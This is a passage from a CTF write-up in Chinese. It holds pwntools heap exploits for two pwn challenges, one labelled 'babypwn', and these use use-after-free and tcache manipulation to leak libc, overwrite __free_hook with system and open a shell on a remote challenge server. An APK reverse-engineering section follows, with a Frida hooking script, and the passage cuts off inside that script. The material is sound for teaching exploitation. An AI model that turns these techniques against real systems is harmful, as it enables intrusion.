    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()
    def leak_address():
        if(context.arch=='i386'):
            return u32(p.recv(4))
        else :
            return u64(p.recv(6).ljust(8,b'\x00'))
    def cho(num):
        sla("scenery\n",str(num))
    def add(size):
        cho(1)
        sla("size:",str(size))
    def delete(idx):
        cho(2)
        sla("idx:",str(idx))
    def show(idx):
        cho(4)
        sla("idx:",str(idx))
    def edit(idx,data):
        cho(3)
        sla("idx:",str(idx))
        sa("chat:",data)
    def gift1(idx):
        cho(5)
        sla("idx",str(idx))
    def gift2():
        cho(666)
    p.recvline()
    addr = int(p.recvline()[:-1],16)
    for i in range(7):
        add(0xf0)
        delete(0)
    add(0xf0)#0
    add(0xf0)#1
    add(0x80)#2
    delete(0)
    delete(1)
    add(0x100)#0
    add(0xe0)#1
    delete(1)
    add(0x100)#1
    delete(2)
    add(0x90)#2
    delete(0)
    edit(0,'aaaa')
    delete(0)
    show(0)
    p.recvuntil('see\n')
    heap_base = leak_address()-0x2a0-0x700
    edit(0,'aaaa')
    delete(0)
    edit(0,'aaaa')
    delete(0)
    edit(0,'aaaa')
    delete(0)
    edit(0,'aaaa')
    delete(0)
    edit(0,'aaaa')
    delete(0)
    edit(0,'aaaa')
    delete(1)
    show(1)
    p.recvuntil('see\n')
    libc_base = leak_address()-0x1ebbe0
    print(hex(heap_base),hex(libc_base))
    delete(0)
    gift2()
    cho(5)
    sl(p64(heap_base+0xc20)+p64(addr-0x10))
    delete(2)
    add(0x100)
    edit(2,p64(libc_base+0x1ebce0))
    print(hex(addr))
    gift1(2)
    ia()
###  babypwn
free之后没清空，可以利用残留数据，任意地址写和任意函数执行
    #!/usr/bin/python
    from pwn import *
    import sys
    context.log_level = 'debug'
    context.arch='amd64'
    local=0
    binary_name='pwn'
    libc_name='libc-2.23.so'
    if local:
        p=process("./"+binary_name)
        libc=ELF("./"+libc_name)
    else:
        p=remote('8.131.69.237',52642)
        e=ELF("./"+binary_name)
        libc=ELF("./"+libc_name)
    def z(a=''):
        if local:
            gdb.attach(p,a)
            if a=='':
                raw_input
        else:
            pass
    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()
    def leak_address():
        if(context.arch=='i386'):
            return u32(p.recv(4))
        else :
            return u64(p.recv(6).ljust(8,b'\x00'))
    def cho(num):
        sla("choice:",str(num))
    def init():
        cho(1)
    def create():
        cho(2)
    def add(size):
        cho(3)
        sla("size:",str(size))
    def edit(data):
        cho(4)
        sla("content:",data)
    def show():
        cho(5)
    def size():
        cho(6)
    init()
    create()
    init()
    add(0x80)
    show()
    p.recvuntil('show:\n')
    libc_base = u64(p.recv(8))-0x3c4b78
    heap_base = u64(p.recv(8))
    print(hex(libc_base),hex(heap_base))
    free_hook = libc_base+libc.sym['__free_hook']
    free_addr = libc_base+libc.sym['free']
    system = libc_base+libc.sym['system']
    #system = libc_base+0x45226
    binsh = heap_base
    menu_addr = 0x400D20
    edit(p64(heap_base+0x10)+p64(heap_base)+p64(0x38323131313131)+p64(0)+p64(menu_addr))
    size()
    edit(p64(heap_base+0x10)+p64(free_hook)+p64(0x38323131313131)+p64(0)+p64(menu_addr)+b'a'*8*11+p64(0x90)+p64(0x21)+p64(heap_base)+p64(0)*2+p64(0x91)+b'/bin/sh\x00')
    size()
    edit(p64(system))
    init()
    ia()
## Reverse
###  apk1
apk文件，java层的逻辑就是获取输入然后传进native的check函数，so中有一个混淆视听的函数check1，但check函数是动态注册的。我们可以用frida
hook
check中的关键部分，结合算法特征，check中函数的参数和返回值识别加密算法，最终发现是RC4和ECB的DES，hook得到密钥，解密即为flag。
frida脚本
    Java.perform(function () {
        //Module.getBaseAddress('libnative-lib.so').add(0x8295)
        Interceptor.attach(Module.getBaseAddress('libnative-lib.so').add(0xE748),{
            onEnter:function(args){
                    console.log("-------------------sub_e748---------------------");
                    this.arg1 = args[1];
                    console.log(hexdump(args[0], {
                            offset: 0,
                            length: 10,
                            header: true,
                            ansi: true
                          }));
                          console.log(hexdump(args[1], {
                            offset: 0,
                            length: 10,
                            header: true,
                            ansi: true
                          }));
                          console.log(hexdump(args[2], {
                            offset: 0,
                            length: 50,
                            header: true,
                            ansi: true
                          }));
                    },
            onLeave:function(retval){
                    console.log(retval);
                    console.log("-------------------sub_e748-leave---------------");
                    console.log(hexdump(this.arg1, {
                        offset: 0,
                        length: 10,
                        header: true,
                        ansi: true
                      }));
            }
        });
        /*
        Interceptor.attach(Module.getBaseAddress('libnative-lib.so').add(0xDB0C),{
            onEnter:function(args){
                    console.log("-------------------sub_DB0C---------------------");
                    this.arg2 = args[2];
                    console.log(hexdump(args[0], {
                            offset: 0,
                            length: 10,
                            header: true,
                            ansi: true
                          }));
                          console.log(hexdump(args[1], {
                            offset: 0,
                            length: 10,
                            header: true,
                            ansi: true
                          }));
                          console.log(hexdump(args[2], {
                            offset: 0,
                            length: 10,
                            header: true,
                            ansi: true
                          }));
                    },
            onLeave:function(retval){
                    console.log(retval);
                    console.log("-------------------sub_DB0C-leave---------------");
                    console.log(hexdump(this.arg2, {
                        offset: 0,
                        length: 10,
                        header: true,
                        ansi: true
                      }));
            }
        });
        Interceptor.attach(Module.getBaseAddress('libnative-lib.so').add(0xD808),{
            onEnter:function(args){
                    //this.var_arg0 = args[0];
                    //console.log('str='+Memory.readUtf8String(args[1]));
                    console.log("-------------------sub_d808---------------------");
                    this.arg1 = args[1];
                    console.log(hexdump(args[0], {
                            offset: 0,
                            length: 10,
                            header: true,
                            ansi: true
                          }));
                    },
            onLeave:function(retval){
                    console.log(retval);
                    console.log("-------------------sub_d808-leave---------------");
                    console.log(hexdump(this.arg1, {
                            offset: 0,
                            length: 10,
                            header: true,
                            ansi: true
                          }));
            }
        });*/
        Interceptor.attach(Module.getBaseAddress('libnative-lib.so').add(0xE260),{
            onEnter:function(args){
                    },
            onLeave:function(retval){
                    console.log("sub_E260 returned with "+retval);
            }
        });
        //sub_E5D0
        Interceptor.attach(Module.getBaseAddress('libnative-lib.so').add(0xE5D0),{
            onEnter:function(args){
                    console.log("-------------------sub_E5D0---------------------");
                    this.arg1 = args[1];
                    console.log(hexdump(args[0], {
                            offset: 0,
                            length: 50,
                            header: true,
                            ansi: true
                          }));
                          console.log(hexdump(args[1], {
                            offset: 0,
                            length: 10,
                            header: true,
                            ansi: true
                          }));
                    },
            onLeave:function(retval){
                    console.log(retval);
                    console.log("-------------------sub_E5D0-leave---------------");
                    console.log(hexdump(this.arg1, {
                        offset: 0,
                        length: 50,
                        header: true,
                        ansi: true
                      }));